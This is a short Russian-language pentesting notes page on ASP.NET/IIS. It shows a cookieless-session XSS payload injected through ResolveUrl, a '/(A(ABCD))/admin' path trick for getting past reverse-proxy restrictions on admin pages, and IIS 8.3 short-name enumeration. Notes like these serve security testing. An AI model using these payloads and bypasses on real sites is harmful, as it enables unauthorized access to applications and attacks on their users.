# ASP.NET / IIS

{% file src="../../.gitbook/assets/V.Kochetkov_breaking_ASP.NET.pdf" %}
Анализ ASP.NET приложений
{% endfile %}

## Tips

### Cookieless session

Источник: [https://t.me/webpwn/302](https://t.me/webpwn/302)

В ASP.NET есть удобная олдскульная фича - cookieless session. Она осталась ещё с тех времён, когда куки поддерживались не всеми браузерами и сессию приходилось передавать внутри URL.

Например:

```
http://www.example.com/(S(lit3py55t21z5v55vlm25s55))/default.aspx
```

При использовании Control.ResolveUrl метода, это значение может выводится без корректного энкодинга символов, что может давать нам XSS-ку:

```
<script src="<%= ResolveUrl("~/Script.js") %>"></script> 
+
http://example.com/(A(%22onerror=%22alert`1`%22))/default.aspx

 ->

 <script src="/(A("onerror="alert`1"))/Script.js"></script>

```

Более подробно об этой особенности и эксплуатации можно почитать [ТУТ](https://blog.isec.pl/all-is-xss-that-comes-to-the-net/)

Кроме того, эту фичу можно использовать для обхода ограничений на реверс прокси к админке приложения бэкэнда (всё что начинается с “/admin”), например:

```
http://victim.com/admin - 403
http://victim.com/(A(ABCD))/admin - 200
```

### Short Names (8.3 convention; Tricks with \~1 in Windows)

Если знаем первые 6 символов директории или файла, то оставшуюся можем заменить на `~1`

![](<../../.gitbook/assets/2021-04-15 18.54.02.jpg>)

Сканер для IIS: [https://github.com/irsdl/iis-shortname-scanner](https://github.com/irsdl/iis-shortname-scanner)
